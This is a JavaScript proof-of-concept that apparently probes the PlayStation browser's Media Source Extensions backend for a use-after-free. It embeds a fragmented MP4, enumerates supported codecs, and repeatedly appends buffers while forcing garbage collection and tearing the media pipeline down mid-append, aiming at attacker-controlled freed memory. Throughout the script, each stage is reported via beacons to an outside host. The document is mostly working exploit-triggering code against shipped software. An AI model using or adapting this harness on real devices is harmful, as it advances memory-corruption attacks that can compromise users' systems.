// MSE append churn - tests whether SourceBufferPrivatePlayStation::appendInternal's
// raw pointer (m_playstation->append(data->data(), data->size())) outlives the
// Ref<SharedBuffer> that owns it.
//
// Reachability was established by cap-sony-surface.js: isTypeSupported("video/mp4;
// codecs=avc1.42E01E") === true and appendBuffer() was actually issued. The only
// remaining question is the one the OSS drop cannot answer, because
// PSSourceBufferBackend lives in Sony's proprietary SDK: does append() copy the
// bytes, or retain the pointer and read it later from the async completion?
//
// If it retains, the first append after the caller's SharedBuffer dies is a
// use-after-free on attacker-sized, attacker-chosen contents - the exact shape of
// the prolapse-class bug, but in the WebProcess instead of the kernel.

(function () {
  'use strict';
  var BASE = 'https://manuals.playstation.net';
  var n = 0;

  function fire(tag) {
    n += 1;
    try {
      var url = BASE + '/beacon/' + String(n).padStart(3, '0') + '-' + encodeURIComponent(tag);
      (navigator.sendBeacon && navigator.sendBeacon(url, '')) ||
        fetch(url, { method: 'POST', body: '', keepalive: true, mode: 'no-cors' }).catch(function(){});
    } catch (e) {}
    try { console.log(tag); } catch (e) {}
  }

  window.onerror = function (m, s, l) { fire('MSE-ONERROR-' + m); };

  // --- a real fragmented MP4 (baseline AVC, empty moov + moof/mdat) ---
  var B64 = "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";

  function bytes(b64) {
    var bin = atob(b64);
    var out = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
    return out;
  }

  function gcPressure() {
    // JSC collects on allocation, not on request; churn large short-lived arrays.
    var junk = [];
    for (var i = 0; i < 400; i++) junk.push(new Array(2048).fill(0.5));
    return junk.length;
  }

  fire('MSE-BOOT');

  if (typeof MediaSource === 'undefined') { fire('MSE-NOMEDIASOURCE'); return; }

  // --- codec matrix: what does Sony's media stack actually claim to decode? ---
  var types = [
    'video/mp4; codecs="avc1.42E01E"',
    'video/mp4; codecs="avc1.64001F"',
    'video/mp4; codecs="hvc1.1.6.L93.B0"',
    'video/mp4; codecs="vp09.00.10.08"',
    'video/mp4; codecs="av01.0.04M.08"',
    'audio/mp4; codecs="mp4a.40.2"',
    'video/webm; codecs="vp9"'
  ];
  types.forEach(function (t, i) {
    var ok = false;
    try { ok = MediaSource.isTypeSupported(t); } catch (e) {}
    fire('MSE-T' + i + '=' + (ok ? 'yes' : 'no'));
  });

  var MEDIA = 'video/mp4; codecs="avc1.42E01E"';
  var video = document.createElement('video');
  video.muted = true;
  video.setAttribute('playsinline', '');
  video.style.cssText = 'position:fixed;left:-2px;top:-2px;width:2px;height:2px;opacity:0.01';
  document.body.appendChild(video);

  var ms = new MediaSource();
  var srcURL = URL.createObjectURL(ms);
  var opened = false;
  var sb = null;

  ms.addEventListener('sourceopen', function () {
    opened = true;
    fire('MSE-SOURCEOPEN');
    try {
      sb = ms.addSourceBuffer(MEDIA);
      fire('MSE-SB-ADDED');
    } catch (e) {
      fire('MSE-SB-THREW-' + e.name);
      return;
    }
    sb.addEventListener('updateend', function () { fire('MSE-UPDATEEND'); });
    sb.addEventListener('error', function () { fire('MSE-SB-ERROR'); });

    // --- phase 1: one clean append, then let the caller's SharedBuffer die ---
    try {
      var seg = bytes(B64);
      sb.appendBuffer(seg);
      seg = null;                       // drop the only reference we hold
      fire('MSE-APPEND1-ISSUED len=' + B64.length);
    } catch (e) {
      fire('MSE-APPEND1-THREW-' + e.name);
    }

    // --- phase 2: churn appends while forcing the buffer to be freed ---
    setTimeout(function () {
      fire('MSE-PHASE2-START state=' + ms.readyState);
      var i = 0;
      function step() {
        if (i >= 120) { fire('MSE-CHURN-DONE'); phase3(); return; }
        i += 1;
        try {
          if (sb && !sb.updating) {
            var chunk = bytes(B64);
            sb.appendBuffer(chunk);
            chunk = null;
            gcPressure();
          }
        } catch (e) {
          fire('MSE-CHURN-THREW-' + e.name + '-i' + i);
        }
        if (i % 20 === 0) fire('MSE-CHURN-i' + i + ' state=' + ms.readyState);
        setTimeout(step, 40);
      }
      step();
    }, 800);

    // --- phase 3: tear the whole pipeline down with appends in flight ---
    function phase3() {
      fire('MSE-PHASE3-TEARDOWN');
      try {
        var late = bytes(B64);
        sb.appendBuffer(late);          // in flight...
        late = null;
        fire('MSE-PHASE3-APPEND-ISSUED');
      } catch (e) {
        fire('MSE-PHASE3-THREW-' + e.name);
      }
      setTimeout(function () {
        try { video.src = ''; } catch (e) {}
        try { video.remove(); } catch (e) {}
        try { URL.revokeObjectURL(srcURL); } catch (e) {}
        sb = null; ms = null; video = null;
        gcPressure(); gcPressure();
        fire('MSE-PHASE3-TORN-DOWN');
        setTimeout(function () { gcPressure(); fire('MSE-SURVIVED'); fire('MSE-DONE'); }, 1500);
      }, 30);
    }
  });

  video.src = srcURL;

  setTimeout(function () {
    if (!opened) { fire('MSE-NO-SOURCEOPEN-10s state=' + ms.readyState); }
    fire('MSE-WATCHDOG');
  }, 10000);
})();
